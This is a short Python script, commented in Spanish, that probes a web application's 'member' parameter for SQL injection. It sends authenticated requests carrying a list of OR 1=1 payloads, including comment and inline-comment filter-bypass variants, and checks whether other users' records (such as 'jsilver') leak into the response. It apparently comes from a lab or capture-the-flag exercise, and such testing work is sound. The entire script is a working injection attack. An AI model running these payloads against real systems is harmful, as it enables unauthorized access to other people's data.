def test_or_injection():
    """Prueba si OR 1=1 muestra más registros"""
    print("\n" + "="*70)
    print("  VERIFICANDO SI OR 1=1 FUNCIONA")
    print("="*70)
    
    # 1. Baseline (solo admin)
    params = {"action": "member", "member": "1"}
    r = requests.get(URL, params=params, cookies=COOKIE)
    print(f"Baseline: {len(r.text)} bytes")
    print(f"Contenido: {r.text[:500]}...")
    
    # 2. OR 1=1 (debería mostrar más usuarios)
    payloads = [
        "1 OR 1=1",
        "1' OR '1'='1",
        "1' OR 1=1-- -",
        "1) OR (1=1",
        "1'/**/OR/**/1=1/**/-- -",
    ]
    
    for payload in payloads:
        params = {"action": "member", "member": payload}
        r = requests.get(URL, params=params, cookies=COOKIE)
        print(f"\nPayload: {payload}")
        print(f"  Length: {len(r.text)} bytes")
        
        # Buscar si aparecen más usuarios
        if "jsilver" in r.text and "jsparow" in r.text:
            print("  ✅ ¡OR 1=1 funciona! Muestra más usuarios")
            print(f"  Contenido: {r.text[:500]}...")
        else:
            print("  ❌ No muestra más usuarios")

test_or_injection()
